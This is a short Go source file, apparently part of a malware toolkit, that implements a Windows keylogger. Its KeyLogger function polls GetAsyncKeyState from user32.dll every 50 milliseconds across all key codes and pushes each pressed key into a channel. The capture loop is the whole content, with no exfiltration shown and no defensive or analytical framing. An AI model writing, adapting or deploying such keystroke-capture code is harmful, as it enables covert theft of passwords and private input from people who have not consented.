package KeyBoard

import (
	"syscall"
	"time"
)

var (
	procGetAsyncKeyState = syscall.NewLazyDLL("user32.dll").NewProc("GetAsyncKeyState")
	CK                   = make(chan KeyBoard, 10000)
)

type KeyBoard struct {
	Char     string
	DateTime time.Time
}

func KeyLogger(ch chan string, _ch *chan bool) {
	var Continue = false
	for {
		select {
		case Continue, _ = <-*_ch:
		default:
			Continue = true
		}
		if !Continue {
			return
		}
		time.Sleep(50 * time.Millisecond)
		for i := 0; i < 0xFF; i++ {
			async, _, _ := procGetAsyncKeyState.Call(uintptr(i))
			if async&0x1 == 0 {
				continue
			}
			ch <- string(i)
		}
	}

}
